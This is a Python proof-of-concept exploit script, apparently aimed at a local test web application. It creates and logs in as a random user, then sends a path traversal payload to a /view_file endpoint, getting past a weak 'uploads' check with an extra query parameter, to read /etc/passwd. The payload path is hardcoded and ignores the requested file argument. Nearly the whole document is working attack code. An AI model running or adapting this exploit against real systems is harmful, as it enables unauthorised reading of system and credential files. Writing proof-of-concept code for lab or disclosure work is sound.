

import requests
import sys
import random
import string

def random_string(length=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def exploit_lfi(target_url, file_to_read):
    """
    Exploits the LFI vulnerability to read an arbitrary file.
    """
    print(f"[*] Starting LFI exploit to read: {file_to_read}")
    s = requests.Session()

    # Step 1: Create and log in as a temporary user
    username = random_string()
    password = random_string()
    register_data = {'username': username, 'password': password, 'password2': password}
    
    try:
        s.post(f"{target_url}/register", data=register_data, timeout=5)
        login_data = {'username': username, 'password': password}
        r_login = s.post(f"{target_url}/login", data=login_data, allow_redirects=False)
        if r_login.status_code != 302:
            print("[-] Failed to log in as temporary user.")
            return
        print("[*] Logged in successfully to get a valid session.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect to the target: {e}")
        return

    # Step 2: Use path traversal to read the file via the new endpoint
    # The payload is crafted to bypass the weak 'uploads' check by including it as a query param
    payload = f"../../../../../../../../etc/passwd"
    params = {'filename': payload, 'uploads': 'true'}
    print(f"[*] Using payload: {payload}")
    
    r_lfi = s.get(f"{target_url}/view_file", params=params)
    
    if r_lfi.status_code == 200 and "root:" in r_lfi.text:
        print(f"[+] Success! Retrieved content of {file_to_read}:\n")
        print("="*50)
        print(r_lfi.text)
        print("="*50)
    else:
        print(f"[-] LFI exploit failed. Status code: {r_lfi.status_code}")
        print(f"[-] Response: {r_lfi.text}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit_bug3.py <target_url>")
        print("Example: python exploit_bug3.py http://127.0.0.1:5000")
        sys.exit(1)
        
    TARGET_URL = sys.argv[1]
    FILE_TO_READ = '/etc/passwd'
    
    exploit_lfi(TARGET_URL, FILE_TO_READ)

